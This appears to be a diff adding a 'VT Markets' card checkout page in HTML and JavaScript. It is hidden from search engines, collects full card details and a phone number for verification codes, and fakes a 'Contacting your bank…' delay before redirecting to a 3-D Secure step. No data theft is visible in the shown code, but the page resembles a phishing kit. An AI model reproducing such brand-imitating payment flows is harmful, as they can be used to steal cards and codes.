@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Secure checkout — VT Markets</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="checkoutfiles/flow.css?v=1">
+</head>
+<body>
+
+    <header class="flow-topbar">
+        <div class="flow-brand">
+            <div class="flow-logo">vt</div>
+            <div class="flow-brand-name">vt <span>markets</span></div>
+        </div>
+        <span class="flow-secure">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <span id="flowSecureLbl">Secure</span>
+        </span>
+    </header>
+
+    <nav class="flow-steps">
+        <div class="fstep" id="fstep1"><span class="fstep-dot">1</span><span class="fstep-label on-mobile">Payment</span></div>
+        <div class="fstep-bar"></div>
+        <div class="fstep" id="fstep2"><span class="fstep-dot">2</span><span class="fstep-label">Verification</span></div>
+        <div class="fstep-bar"></div>
+        <div class="fstep" id="fstep3"><span class="fstep-dot">3</span><span class="fstep-label">Confirmation</span></div>
+    </nav>
+
+    <main class="flow-main">
+        <div class="flow-card">
+
+            <!-- ============ LEFT: ORDER SUMMARY ============ -->
+            <aside class="flow-summary">
+                <div>
+                    <a class="sum-back" href="home.html">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                        <span id="sumBackLbl">Back to VT Markets</span>
+                    </a>
+
+                    <div class="sum-label" id="sumLabel">Amount to pay</div>
+                    <div class="sum-amount" id="sumAmount">$ 0.00</div>
+                    <div class="sum-sub" id="sumRef">Ref —</div>
+
+                    <div class="sum-lines">
+                        <div class="sum-row"><span id="sumDepositLbl">Deposit</span><span id="sumDepositVal">—</span></div>
+                        <div class="sum-row"><span id="sumFeeLbl">Fee</span><span class="sum-free" id="sumFeeVal">Free</span></div>
+                        <div class="sum-row"><span id="sumRateLbl">Rate</span><span>1.0000</span></div>
+                        <div class="sum-sep"></div>
+                        <div class="sum-row total"><span id="sumTotalLbl">Total</span><span id="sumTotalVal">—</span></div>
+                    </div>
+                </div>
+
+                <div class="sum-trust">
+                    <div class="sum-trust-row">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                        <span id="sumTrust1">Segregated custody</span>
+                    </div>
+                    <div class="sum-trust-row">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        <span id="sumTrust2">TLS encryption</span>
+                    </div>
+                    <div class="sum-trust-row">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="M22 4L12 14.01l-3-3"/></svg>
+                        <span id="sumTrust3">PCI-DSS certified</span>
+                    </div>
+                </div>
+            </aside>
+
+            <!-- ============ RIGHT: PAYMENT FORM ============ -->
+            <section class="flow-panel">
+                <h1 class="flow-h1" id="ttlPayment">Payment details</h1>
+                <p class="flow-lede" id="ttlLede">Enter your card and billing address. Your bank will ask you to confirm the payment on the next step.</p>
+
+                <form id="payForm" novalidate>
+                    <div class="flow-section" id="secContact">Contact</div>
+                    <div class="f-field">
+                        <label class="f-label" id="lblEmail">Email address</label>
+                        <input type="email" class="f-input" id="fEmail" autocomplete="email" placeholder="you@example.com">
+                    </div>
+                    <div class="f-field">
+                        <label class="f-label" id="lblPhone">Mobile number</label>
+                        <input type="tel" class="f-input" id="fPhone" autocomplete="tel" placeholder="+1 514 555 0142">
+                        <div class="f-legal" style="text-align:left;margin-top:5px" id="hintPhone">Used to send your one-time verification code.</div>
+                    </div>
+
+                    <div class="flow-section" id="secCard">Card</div>
+                    <div class="f-field">
+                        <label class="f-label" id="lblCardNum">Card number</label>
+                        <div class="f-card-group">
+                            <div class="f-card-row">
+                                <input type="text" class="f-input f-flat" id="fCardNum" inputmode="numeric" maxlength="23" placeholder="1234 1234 1234 1234" autocomplete="cc-number">
+                                <span class="f-brand" id="cardBrand"></span>
+                            </div>
+                            <div class="f-card-split">
+                                <input type="text" class="f-input f-flat" id="fExp" inputmode="numeric" maxlength="7" placeholder="MM / YY" autocomplete="cc-exp">
+                                <input type="text" class="f-input f-flat" id="fCvc" inputmode="numeric" maxlength="4" placeholder="CVC" autocomplete="cc-csc">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="f-field">
+                        <label class="f-label" id="lblName">Cardholder name</label>
+                        <input type="text" class="f-input" id="fName" autocomplete="cc-name" placeholder="John Doe">
+                    </div>
+
+                    <div class="flow-section" id="secBilling">Billing address</div>
+                    <div class="f-field">
+                        <label class="f-label" id="lblAddr">Address</label>
+                        <input type="text" class="f-input" id="fAddr1" autocomplete="billing address-line1" placeholder="Street address">
+                    </div>
+                    <div class="f-field">
+                        <input type="text" class="f-input" id="fAddr2" autocomplete="billing address-line2" placeholder="Apartment, suite, unit (optional)">
+                    </div>
+                    <div class="f-row-2">
+                        <div class="f-field">
+                            <label class="f-label" id="lblCity">City</label>
+                            <input type="text" class="f-input" id="fCity" autocomplete="billing address-level2" placeholder="Montréal">
+                        </div>
+                        <div class="f-field">
+                            <label class="f-label" id="lblRegion">Province</label>
+                            <select class="f-input" id="fRegion"></select>
+                        </div>
+                    </div>
+                    <div class="f-row-2">
+                        <div class="f-field">
+                            <label class="f-label" id="lblCountry">Country</label>
+                            <select class="f-input" id="fCountry">
+                                <option value="CA">Canada</option>
+                                <option value="US">United States</option>
+                                <option value="GB">United Kingdom</option>
+                                <option value="FR">France</option>
+                                <option value="AU">Australia</option>
+                                <option value="CH">Switzerland</option>
+                            </select>
+                        </div>
+                        <div class="f-field">
+                            <label class="f-label" id="lblPostal">Postal code</label>
+                            <input type="text" class="f-input" id="fPostal" autocomplete="billing postal-code" placeholder="H3B 2Y5">
+                        </div>
+                    </div>
+
+                    <label class="f-check">
+                        <input type="checkbox" id="fSave" checked>
+                        <span id="lblSave">Save this card for future deposits</span>
+                    </label>
+
+                    <div class="f-error" id="payError"></div>
+
+                    <button type="submit" class="f-submit" id="payBtn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        <span id="payBtnLbl">Pay</span> <strong id="payBtnAmount">—</strong>
+                    </button>
+
+                    <p class="f-legal" id="payLegal">You will be redirected to your card issuer for 3-D Secure verification.</p>
+                </form>
+            </section>
+        </div>
+    </main>
+
+    <footer class="flow-foot" id="flowFoot"></footer>
+
+    <script src="checkoutfiles/flow.js?v=1"></script>
+    <script>
+    (function () {
+        'use strict';
+
+        // init() always returns an order — a sample one when the page is
+        // opened on its own, flagged so the preview banner shows.
+        var order = VTFlow.init();
+
+        VTFlow.paintChrome(1);
+        VTFlow.paintSummary(order);
+
+        var L = VTFlow.lang();
+        var T = function (en, fr, es) { return L === 'fr' ? fr : L === 'es' ? es : en; };
+
+        var txt = {
+            ttlPayment: T('Payment details', 'Informations de paiement', 'Datos de pago'),
+            ttlLede: T('Enter your card and billing address. Your bank will ask you to confirm the payment on the next step.',
+                       "Saisissez votre carte et votre adresse de facturation. Votre banque vous demandera de confirmer le paiement à l'étape suivante.",
+                       'Introduce tu tarjeta y dirección de facturación. Tu banco te pedirá confirmar el pago en el siguiente paso.'),
+            secContact: T('Contact', 'Contact', 'Contacto'),
+            secCard: T('Card', 'Carte', 'Tarjeta'),
+            secBilling: T('Billing address', 'Adresse de facturation', 'Dirección de facturación'),
+            lblEmail: T('Email address', 'Adresse e-mail', 'Correo electrónico'),
+            lblPhone: T('Mobile number', 'Numéro de mobile', 'Número de móvil'),
+            hintPhone: T('Used to send your one-time verification code.',
+                         'Utilisé pour envoyer votre code de vérification à usage unique.',
+                         'Se usa para enviar tu código de verificación de un solo uso.'),
+            lblCardNum: T('Card number', 'Numéro de carte', 'Número de tarjeta'),
+            lblName: T('Cardholder name', 'Nom du titulaire', 'Nombre del titular'),
+            lblAddr: T('Address', 'Adresse', 'Dirección'),
+            lblCity: T('City', 'Ville', 'Ciudad'),
+            lblCountry: T('Country', 'Pays', 'País'),
+            lblSave: T('Save this card for future deposits',
+                       'Enregistrer cette carte pour mes prochains dépôts',
+                       'Guardar esta tarjeta para futuros depósitos'),
+            payBtnLbl: T('Pay', 'Payer', 'Pagar'),
+            payLegal: T('You will be redirected to your card issuer for 3-D Secure verification.',
+                        'Vous serez redirigé vers l’émetteur de votre carte pour la vérification 3-D Secure.',
+                        'Serás redirigido al emisor de tu tarjeta para la verificación 3-D Secure.')
+        };
+        Object.keys(txt).forEach(function (id) {
+            var e = document.getElementById(id);
+            if (e) e.textContent = txt[id];
+        });
+
+        document.getElementById('fAddr2').placeholder =
+            T('Apartment, suite, unit (optional)', 'Appartement, suite (facultatif)', 'Apartamento, suite (opcional)');
+        document.getElementById('payBtnAmount').textContent = VTFlow.money(order.amount, order.currency);
+        document.getElementById('cardBrand').innerHTML = VTCard.BRANDS.generic;
+
+        /* ---------- country → region / postal ---------- */
+        var REGIONS = {
+            CA: { label: T('Province', 'Province', 'Provincia'), postal: T('Postal code', 'Code postal', 'Código postal'), eg: 'H3B 2Y5',
+                  list: ['Alberta', 'British Columbia', 'Manitoba', 'New Brunswick', 'Newfoundland and Labrador', 'Northwest Territories',
+                         'Nova Scotia', 'Nunavut', 'Ontario', 'Prince Edward Island', 'Quebec', 'Saskatchewan', 'Yukon'] },
+            US: { label: T('State', 'État', 'Estado'), postal: T('ZIP code', 'Code ZIP', 'Código ZIP'), eg: '10001',
+                  list: ['Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut','Delaware','Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa','Kansas','Kentucky','Louisiana','Maine','Maryland','Massachusetts','Michigan','Minnesota','Mississippi','Missouri','Montana','Nebraska','Nevada','New Hampshire','New Jersey','New Mexico','New York','North Carolina','North Dakota','Ohio','Oklahoma','Oregon','Pennsylvania','Rhode Island','South Carolina','South Dakota','Tennessee','Texas','Utah','Vermont','Virginia','Washington','West Virginia','Wisconsin','Wyoming'] },
+            GB: { label: T('County', 'Comté', 'Condado'), postal: T('Postcode', 'Code postal', 'Código postal'), eg: 'SW1A 1AA', list: [] },
+            FR: { label: T('Region', 'Région', 'Región'), postal: T('Postal code', 'Code postal', 'Código postal'), eg: '75001', list: [] },
+            AU: { label: T('State', 'État', 'Estado'), postal: T('Postcode', 'Code postal', 'Código postal'), eg: '2000',
+                  list: ['Australian Capital Territory','New South Wales','Northern Territory','Queensland','South Australia','Tasmania','Victoria','Western Australia'] },
+            CH: { label: T('Canton', 'Canton', 'Cantón'), postal: T('Postal code', 'Code postal', 'Código postal'), eg: '8001', list: [] }
+        };
+
+        function applyCountry(code) {
+            var cfg = REGIONS[code] || REGIONS.CA;
+            document.getElementById('lblRegion').textContent = cfg.label;
+            document.getElementById('lblPostal').textContent = cfg.postal;
+            var postal = document.getElementById('fPostal');
+            postal.placeholder = cfg.eg;
+            postal.value = '';
+
+            var slot = document.getElementById('fRegion');
+            var replacement;
+            if (cfg.list.length) {
+                replacement = document.createElement('select');
+                replacement.innerHTML = cfg.list.map(function (r) { return '<option>' + r + '</option>'; }).join('');
+            } else {
+                replacement = document.createElement('input');
+                replacement.type = 'text';
+                replacement.placeholder = cfg.label;
+            }
+            replacement.className = 'f-input';
+            replacement.id = 'fRegion';
+            slot.parentNode.replaceChild(replacement, slot);
+        }
+
+        document.getElementById('fCountry').addEventListener('change', function () { applyCountry(this.value); });
+        applyCountry('CA');
+
+        /* ---------- input formatting ---------- */
+        var num = document.getElementById('fCardNum');
+        num.addEventListener('input', function () { VTCard.formatNumber(num); });
+        document.getElementById('fExp').addEventListener('input', function () { VTCard.formatExpiry(this); });
+        document.getElementById('fCvc').addEventListener('input', function () { this.value = this.value.replace(/\D/g, ''); });
+
+        /* ---------- submit ---------- */
+        function fail(msg) {
+            var box = document.getElementById('payError');
+            box.textContent = msg;
+            box.classList.add('show');
+            box.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+
+        document.getElementById('payForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            document.getElementById('payError').classList.remove('show');
+
+            var v = function (id) { return (document.getElementById(id).value || '').trim(); };
+            var digits = v('fCardNum').replace(/\D/g, '');
+            var exp = v('fExp').replace(/\D/g, '');
+
+            if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(v('fEmail')))
+                return fail(T('Enter a valid email address.', 'Saisissez une adresse e-mail valide.', 'Introduce un correo válido.'));
+            if (v('fPhone').replace(/\D/g, '').length < 8)
+                return fail(T('Enter a valid mobile number.', 'Saisissez un numéro de mobile valide.', 'Introduce un número de móvil válido.'));
+            if (!VTCard.luhn(digits))
+                return fail(T('That card number is not valid.', "Ce numéro de carte n'est pas valide.", 'Ese número de tarjeta no es válido.'));
+            if (exp.length < 4 || parseInt(exp.slice(0, 2), 10) > 12 || parseInt(exp.slice(0, 2), 10) < 1)
+                return fail(T('Enter a valid expiry date.', "Saisissez une date d'expiration valide.", 'Introduce una fecha de caducidad válida.'));
+            if (v('fCvc').length < 3)
+                return fail(T('Enter the security code.', 'Saisissez le code de sécurité.', 'Introduce el código de seguridad.'));
+            if (!v('fName'))
+                return fail(T('Enter the cardholder name.', 'Saisissez le nom du titulaire.', 'Introduce el nombre del titular.'));
+            if (!v('fAddr1') || !v('fCity') || !v('fPostal'))
+                return fail(T('Complete your billing address.', 'Complétez votre adresse de facturation.', 'Completa tu dirección de facturación.'));
+
+            // Leaving preview: this is now a genuine attempt
+            if (order.preview) {
+                order.preview = false;
+                order.authorised = false;
+                order.ref = 'VTM-' + Date.now().toString(36).toUpperCase().slice(-8);
+            }
+
+            // Only the last four digits and the brand are carried forward.
+            order.card4 = digits.slice(-4);
+            order.brand = VTCard.detect(digits);
+            order.email = v('fEmail');
+            order.phone = v('fPhone');
+            order.country = v('fCountry');
+            VTFlow.write(order);
+
+            var btn = document.getElementById('payBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="f-spinner"></span> ' +
+                T('Contacting your bank…', 'Contact de votre banque…', 'Contactando con tu banco…');
+
+            setTimeout(function () { VTFlow.go('verify-3ds.html'); }, 1300);
+        });
+    })();
+    </script>
+</body>
+</html>
